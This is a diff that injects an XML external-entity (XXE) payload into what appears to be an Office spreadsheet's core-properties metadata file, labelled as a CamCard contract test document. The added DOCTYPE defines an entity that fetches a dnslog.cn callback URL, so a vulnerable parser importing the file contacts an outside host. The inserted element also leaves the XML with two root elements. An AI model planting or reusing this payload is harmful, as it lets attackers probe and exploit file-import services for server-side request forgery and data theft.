@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://n66vw1.dnslog.cn/"> ]>
+<x>&xxe;</x>
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Office XLS Test Document</dc:title><dc:subject>Office XLS Test Document</dc:subject><dc:creator>B.CAMCARD.COM</dc:creator><cp:keywords>CAMCARD CONTRACT XLS</cp:keywords><dc:description>Test document for Office XLS, generated using PHP classes.</dc:description><cp:lastModifiedBy>LiaoLian</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2023-07-06T03:45:16Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2023-07-06T03:46:47Z</dcterms:modified><cp:category>From B.CAMCARD.COM file</cp:category></cp:coreProperties>
